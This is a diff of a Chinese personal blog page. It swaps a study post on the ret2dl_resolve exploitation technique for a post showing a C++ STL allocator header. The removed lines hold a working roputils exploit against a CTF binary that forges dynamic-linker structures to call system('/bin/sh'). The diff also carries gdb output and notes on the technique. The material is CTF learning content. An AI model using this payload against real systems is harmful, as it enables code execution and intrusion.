@@ -88,17 +88,17 @@
 
 
 
-<meta name="description" content="关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。 等什么时候真正看懂了，再补上吧。 网络上前辈的教程：  http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://angelboy.logdown.com/posts/283218-return-to-dl-resolvehttp://pwn">
+<meta name="description" content="✍✍✍ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对于ret2dl_resolve的探究">
-<meta property="og:url" content="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/index.html">
+<meta property="og:title" content="STL_allocator.h">
+<meta property="og:url" content="http://yoursite.com/2020/05/17/STL-allocator-h/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。 等什么时候真正看懂了，再补上吧。 网络上前辈的教程：  http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://angelboy.logdown.com/posts/283218-return-to-dl-resolvehttp://pwn">
+<meta property="og:description" content="✍✍✍ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-29T09:20:26.592Z">
+<meta property="og:updated_time" content="2020-05-17T09:41:41.940Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对于ret2dl_resolve的探究">
-<meta name="twitter:description" content="关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。 等什么时候真正看懂了，再补上吧。 网络上前辈的教程：  http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://angelboy.logdown.com/posts/283218-return-to-dl-resolvehttp://pwn">
+<meta name="twitter:title" content="STL_allocator.h">
+<meta name="twitter:description" content="✍✍✍ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011">
 
 
 
@@ -128,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/">
+  <link rel="canonical" href="http://yoursite.com/2020/05/17/STL-allocator-h/">
 
 
 
 
 
-  <title>对于ret2dl_resolve的探究 | zhz'blog</title>
+  <title>STL_allocator.h | zhz'blog</title>
   
 
 
@@ -295,7 +295,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/17/STL-allocator-h/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zhz">
@@ -312,7 +312,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">对于ret2dl_resolve的探究</h1>
+          <h1 class="post-title" itemprop="name headline">STL_allocator.h</h1>
         
 
         <div class="post-meta">
@@ -324,8 +324,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-28T23:32:04+08:00">
-                2019-10-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-17T17:41:06+08:00">
+                2020-05-17
               </time>
             
 
@@ -398,34 +398,10 @@
       
 
       
-        <p>关于ret2dl_resolve的研究，其实我个人看的不是很懂，这里算是简单记录一下而已。</p>
-<p>等什么时候真正看懂了，再补上吧。</p>
-<p>网络上前辈的教程：</p>
-<blockquote>
-<p><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="https://github.com/inaz2/roputils/blob/master/roputils.py" target="_blank" rel="noopener">https://github.com/inaz2/roputils/blob/master/roputils.py</a></p>
-</blockquote>
-<p>具体的，前辈们已经介绍的很详细了，在这里，我只是赘述自己学到的，整理一下自己能简单理解的东西</p>
-<h1 id="ret2dl-resolve的核心原理"><a href="#ret2dl-resolve的核心原理" class="headerlink" title="ret2dl_resolve的核心原理"></a>ret2dl_resolve的核心原理</h1><p> ret2dl-resolve的核心原理是攻击符号重定位流程，使其解析库中存在的任意函数地址，从而实现got表的劫持。 </p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="为什么要设置延迟绑定"><a href="#为什么要设置延迟绑定" class="headerlink" title="为什么要设置延迟绑定"></a>为什么要设置延迟绑定</h2><p>​        要想回答这个问题，首先我们得从动态链接说起。为了减少存储器浪费，现代操作系统支持动态链接特性。即不是在程序编译的时候就把外部的库函数编译进去，而是在运行时再把包含有对应函数的库加载到内存里。由于内存空间有限，选用函数库的组合无限，显然程序不可能在运行之前就知道自己用到的函数会在哪个地址上。</p>
-<p>​        比如说对于libc.so来说，我们要求把它加载到地址0x1000处，A程序只引用了libc.so，从理论上来说这个要求不难办到。但是对于用了liba,so, libb.so, libc.so……liby.so, libz.so的B程序来说，0x1000这个地址可能就被liba.so等库占据了。因此，程序在运行时碰到了外部符号，就需要去找到它们真正的内存地址，这个过程被称为重定位。</p>
-<p>​        为了安全，现代操作系统的设计要求代码所在的内存必须是不可修改的，那么诸如call read一类的指令即没办法在编译阶段直接指向read函数所在地址，又没办法在运行时修改成read函数所在地址，怎么保证CPU在运行到这行指令时能正确跳到read函数呢？这就需要got表（Global Offset Table，全局偏移表）和plt表（Procedure Linkage Table，过程链接表）进行辅助了。 </p>
-<p>​         在延迟加载的情况下，每个外部函数的got表都会被初始化成plt表中对应项的地址。当call指令执行时，EIP直接跳转到plt表的一个jmp，这个jmp直接指向对应的got表地址，从这个地址取值。此时这个jmp会跳到保存好的，plt表中对应项的地址，在这里把每个函数重定位过程中唯一的不同点，即一个数字入栈（本例子中write是18h,read是0，对于单个程序来说，这个数字是不变的），然后push got[1]并跳转到got[2]保存的地址。在这个地址中对函数进行了重定位，并且修改got表为真正的函数地址。当第二次调用同一个函数的时候，call仍然使EIP跳转到plt表的同一个jmp，不同的是这回从got表取值取到的是真正的地址，从而避免重复进行重定位。 </p>
-<p>进行跟进分析后，发现，主要影响重定位的，是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           struct link_map *__unbounded l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
+        <p>✍✍✍</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ALLOCATOR_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ALLOCATOR_H_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个头文件包含一个模板类 allocator，用于管理内存的分配、释放，对象的构造、析构</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"construct.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"util.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mystl</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模板类：allocator</span></span><br><span class="line">    <span class="comment">// 模板函数代表数据类型</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">allocator</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">typedef</span> T            value_type;</span><br><span class="line">        <span class="keyword">typedef</span> T*           pointer;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">const</span> T*     const_pointer;</span><br><span class="line">        <span class="keyword">typedef</span> T&amp;           reference;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">const</span> T&amp;     const_reference;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">size_t</span>       size_type;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">ptrdiff_t</span>    difference_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">static</span> T* <span class="title">allocate</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> T* <span class="title">allocate</span><span class="params">(size_type n)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deallocate</span><span class="params">(T* ptr)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deallocate</span><span class="params">(T* ptr, size_type n)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">construct</span><span class="params">(T* ptr)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">construct</span><span class="params">(T* ptr, <span class="keyword">const</span> T&amp; value)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">construct</span><span class="params">(T* ptr, T&amp;&amp; value)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span>... <span class="title">Args</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">static</span> <span class="title">void</span> <span class="title">construct</span>(<span class="title">T</span>* <span class="title">ptr</span>, <span class="title">Args</span>&amp;&amp; ...<span class="title">args</span>);</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">(T* ptr)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">(T* first, T* last)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">T</span>* <span class="title">allocator</span>&lt;T&gt;:</span>:allocate()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;T*&gt;(::<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="keyword">sizeof</span>(T)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">T</span>* <span class="title">allocator</span>&lt;T&gt;:</span>:allocate(size_type n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;T*&gt;(::<span class="keyword">operator</span> <span class="keyword">new</span>(n * <span class="keyword">sizeof</span>(T)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:deallocate(T* ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        ::<span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(ptr)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:deallocate(T* ptr, size_type <span class="comment">/*size*/</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        ::<span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(ptr)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:construct(T* ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        mystl::construct(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:construct(T* ptr, <span class="keyword">const</span> T&amp; value)</span><br><span class="line">    &#123;</span><br><span class="line">        mystl::construct(ptr, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:construct(T* ptr, T&amp;&amp; value)</span><br><span class="line">    &#123;</span><br><span class="line">        mystl::construct(ptr, mystl::move(value));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">template</span> &lt;class ...Args&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:construct(T* ptr, Args&amp;&amp; ...args)</span><br><span class="line">    &#123;</span><br><span class="line">        mystl::construct(ptr, mystl::forward&lt;Args&gt;(args)...);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:destroy(T* ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        mystl::destroy(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//override</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">void</span> <span class="title">allocator</span>&lt;T&gt;:</span>:destroy(T* first, T* last)</span><br><span class="line">    &#123;</span><br><span class="line">        mystl::destroy(first, last);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
 
-<p>中的reloc_arg， 我们主要控制reloc_arg进行攻击。</p>
-<h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read 0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure>
 
-<p>在第一次调用时，<code>jmp read@got.plt</code>会跳回<code>read@plt</code>，这是我们已经知道的。接下来，会将参数push到栈上并跳至<code>.got.plt+0x8</code>，这相当于调用以下函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset);</span><br></pre></td></tr></table></figure>
-
-<p>​        </p>
-<p>​        这就是重定位符号表，因为第一次调用函数的时候，并不是直接跳转到libc空间中的函数，而是在这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会通过两次push，最后跳到libc的_dl_runtime_resolve去执行。_dl_runtime_resolve的目的，是根据push 的两个参数导出函数的地址，然后放到相应的GOT表，并且调用它。 </p>
-<p>那么，我们的思路是在内存中伪造Elf32_Rel和Elf32_Sym两个结构体，并手动传递reloc_arg使其指向我们伪造的结构体，让Elf32_Sym.st_name的偏移值指向预先放在内存中的字符串system完成攻击。 </p>
-<h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><p>​        方法变成了覆盖 (link_map + 0x1c8) 处为 NULL, 也就是<code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code>这一句.<br>​        但是link_map是在ld.so上的,因此我们需要leak,若程序没有输出函数,则无法使用这个方法. </p>
-<h1 id="使用ROPutils简化攻击步骤"><a href="#使用ROPutils简化攻击步骤" class="headerlink" title="使用ROPutils简化攻击步骤"></a>使用ROPutils简化攻击步骤</h1><p>使用通常的构造payload过程繁琐，虽然格式化，但是还是不利于我们编写。故此，我们使用roputils.py这个模块进行ret2_dl_resolve攻击</p>
-<p>以 XMAN 2016-level3/level4 为例</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROP</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./level4'</span>)                        <span class="comment">#ROP继承了ELF类，下面的section, got, plt都是调用父类的方法</span></span><br><span class="line">bss_addr = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">read_got = rop.got(<span class="string">'read'</span>)</span><br><span class="line">read_plt = rop.plt(<span class="string">'read'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">io = Proc(host = <span class="string">'172.17.0.2'</span>, port = <span class="number">10001</span>)        <span class="comment">#roputils中这里需要显式指定参数名</span></span><br><span class="line"></span><br><span class="line">buf = rop.fill(offset)                        <span class="comment">#fill用于生成填充数据</span></span><br><span class="line">buf += rop.call(read_plt, <span class="number">0</span>, bss_addr, <span class="number">0x100</span>)        <span class="comment">#call可以通过某个函数的plt地址方便地进行调用</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_addr+<span class="number">0x20</span>, bss_addr)        <span class="comment">#dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处</span></span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br><span class="line"></span><br><span class="line">然后我们直接用dl_resolve_data生成伪造的link_map并发送</span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)                </span><br><span class="line">buf += rop.fill(<span class="number">0x20</span>, buf)                <span class="comment">#如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_addr+<span class="number">0x20</span>, <span class="string">'system'</span>)        <span class="comment">#dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名</span></span><br><span class="line">buf += rop.fill(<span class="number">0x100</span>, buf)</span><br><span class="line"></span><br><span class="line">io.write(buf)</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -441,12 +417,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2019/10/28/对于ret2-resolve的探究/">对于ret2dl_resolve的探究</a></p>
+  <p><span>本文标题:</span><a href="/2020/05/17/STL-allocator-h/">STL_allocator.h</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
-  <p><span>发布时间:</span>2019年10月28日 - 23:10</p>
-  <p><span>最后更新:</span>2019年10月29日 - 17:10</p>
-  <p><span>原始链接:</span><a href="/2019/10/28/对于ret2-resolve的探究/" title="对于ret2dl_resolve的探究">http://yoursite.com/2019/10/28/对于ret2-resolve的探究/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2020年05月17日 - 17:05</p>
+  <p><span>最后更新:</span>2020年05月17日 - 17:05</p>
+  <p><span>原始链接:</span><a href="/2020/05/17/STL-allocator-h/" title="STL_allocator.h">http://yoursite.com/2020/05/17/STL-allocator-h/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2020/05/17/STL-allocator-h/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -482,7 +458,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/10/28/对于ret2-resolve的探究/" title="对于ret2dl_resolve的探究">http://yoursite.com/2019/10/28/对于ret2-resolve的探究/</a>
+    <a href="http://yoursite.com/2020/05/17/STL-allocator-h/" title="STL_allocator.h">http://yoursite.com/2020/05/17/STL-allocator-h/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -504,8 +480,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/28/对于canary的ssp-leak打法的学习（好像又名Stack-smash）/" rel="next" title="对于canary的ssp leak打法的学习（好像又名Stack smash）">
-                <i class="fa fa-chevron-left"></i> 对于canary的ssp leak打法的学习（好像又名Stack smash）
+              <a href="/2020/05/17/STL-alloc-h/" rel="next" title="STL_alloc.h">
+                <i class="fa fa-chevron-left"></i> STL_alloc.h
               </a>
             
           </div>
@@ -514,8 +490,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/10/29/”复现题目中探究的一些杂记“/" rel="prev" title="复现题目中探究的一些杂记">
-                复现题目中探究的一些杂记 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/05/17/STL-type-traits-h/" rel="prev" title="STL_type_traits.h">
+                STL_type_traits.h <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -568,17 +544,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -629,22 +596,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dl-resolve的核心原理"><span class="nav-number">1.</span> <span class="nav-text">ret2dl_resolve的核心原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么要设置延迟绑定"><span class="nav-number">2.1.</span> <span class="nav-text">为什么要设置延迟绑定</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x86"><span class="nav-number">3.</span> <span class="nav-text">x86</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x64"><span class="nav-number">4.</span> <span class="nav-text">x64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用ROPutils简化攻击步骤"><span class="nav-number">5.</span> <span class="nav-text">使用ROPutils简化攻击步骤</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
